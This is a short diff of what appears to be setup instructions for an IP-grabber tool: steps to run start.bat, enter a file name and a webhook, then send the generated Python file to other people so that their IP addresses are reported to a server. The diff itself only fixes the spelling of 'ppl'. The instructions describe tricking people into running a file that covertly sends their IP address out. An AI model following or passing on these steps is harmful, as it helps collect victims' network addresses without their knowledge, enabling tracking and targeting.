@@ -7,7 +7,7 @@ Setup:
 3. run start.bat
 4. enter file name
 5. enter webhook
-6. send ppl the new python file and their ip will be sent in server
+6. send people the new python file and their ip will be sent in server
 
 #-----------------
 
